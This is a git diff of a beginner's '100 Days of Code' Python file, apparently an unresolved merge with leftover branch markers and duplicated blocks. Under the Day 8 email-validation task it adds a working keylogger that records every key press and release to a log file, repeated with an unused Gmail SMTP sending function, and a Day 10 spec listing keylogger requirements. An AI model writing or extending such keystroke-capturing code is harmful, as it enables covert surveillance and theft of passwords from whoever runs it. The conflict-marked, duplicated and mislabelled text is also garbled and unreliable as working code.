@@ -261,7 +261,11 @@ DAY 8
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-08
 ### Description: This is the eighth day of the 100 Days of Code challenge.
+ my_branch
 ### The task is to create a program that can verify email address 
+=======
+### The task is to create a program that can verify email address and Key Logger
+  Osman--branch
 
 import re
 
@@ -276,20 +280,121 @@ def verify_email(email):
         bool: True if the email address is valid, False otherwise.
     """
     email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
+ my_branch
     try:
         return bool(re.match(email_regex, email))
     except TypeError:
+=======
+    if re.match(email_regex, email):
+        return True
+    else:
+  Osman--branch
         return False
 
 def main():
     # Test the verify_email function
+  my_branch
     emails = ["alpha62@gmail.com.com", "musabihi6563@gmail.com", "test@.com", None, 123]
     for email in emails: 
+=======
+    emails = ["test@example.com", "test.example.com", "test@.com"]
+    for email in emails:
+  Osman--branch
         print(f"Email: {email}, Valid: {verify_email(email)}")
 
 if __name__ == "__main__":
     main()
 
+  my_branch
+=======
+import keyboard
+import time
+import threading
+import logging
+import datetime
+import os
+import platform
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
+
+import os
+import platform
+import time
+import datetime
+import logging
+import threading
+import keyboard
+import re
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def send_email(subject, message, from_addr, to_addr, password):
+    msg = MIMEMultipart()
+    msg['From'] = from_addr
+    msg['To'] = to_addr
+    msg['Subject'] = subject
+    msg.attach(MIMEText(message, 'plain'))
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(from_addr, password)
+    text = msg.as_string()
+    server.sendmail(from_addr, to_addr, text)
+    server.quit()
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
+
+  Osman--branch
  DAY 9
 ===============================
 ### Author: ABDULLAHI AHMED OSMAN
@@ -343,16 +448,44 @@ def main():
 if __name__ == "__main__":
     main()
 
+  my_branch
  DAY 10
 ===============================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-10
 ### Description: This is the tenth day of the 100 Days of Code challenge.
+=======
+DAY 10
+===============================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-10
+### Description: This is the ninth day of the 100 Days of Code challenge.
+  Osman--branch
 ### The task is to create a program that can send an email using the provided details.
 ### The program should ask for user input for the subject, message, sender's email address, recipient
 's email address, and sender's email password.
 ### The program should then send an email using the provided details.
+  my_branch
 
+=======
+### The program should handle any exceptions that may occur during the email sending process.
+### The program should print a success message if the email is sent successfully.
+### The program should print an error message if an exception occurs during the email sending process.
+### The program should use the smtplib library to send the email.
+### The program should use the MIMEMultipart class to create a multipart message.
+### The program should use the MIMEText class to create a plain text message.
+### The program should use the starttls method to start a TLS connection with the SMTP server.
+### The program should use the login method to login to the sender's email account.
+### The program should use the sendmail method to send the email.
+### The program should use the quit method to close the SMTP connection.
+### The program should use the keyboard library to listen for keyboard events.
+### The program should use the on_key_press and on_key_release functions to handle keyboard events.
+### The program should use the join method to wait for the keyboard listener to stop.
+### The program should use the finally block to print a message when the program stops.
+### The program should use the if __name__ == "__main__": block to ensure the main
+function is called when the program is run directly.
+python
+ Osman--branch
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -405,8 +538,12 @@ DAY 11
 ### Date: 2025-01-11
 ### Description: This is the eleventh day of the 100 Days of Code challenge.
 ### The task is to create a program that allows to track our expenses and income. The program should be able to add, remove, and display expenses and income.
+ my_branch
 ### The program should also be able to calculate the total income and total expenses.
 ### The task is to create a simple expense tracker using Python classes.
+=======
+### The program should also be able to calculate the total income and total expenses
+  Osman--branch
 python
 class ExpenseTracker:
     def __init__(self):
@@ -481,7 +618,12 @@ def main():
 if __name__ == "__main__":
     main()
 
+ my_branch
  DAY 12
+=======
+
+DAY 12
+  Osman--branch
 ==============================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-12
@@ -818,7 +960,10 @@ def main():
 if __name__ == "__main__":
     main()
 
+  my_branch
 
+=======
+  Osman--branch
 DAY 15
 ================
 ### Author: ABDULLAHI AHMED OSMAN
@@ -882,4 +1027,9 @@ def main():
             print("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
+ my_branch
     main()
+=======
+    main()
+
+  Osman--branch
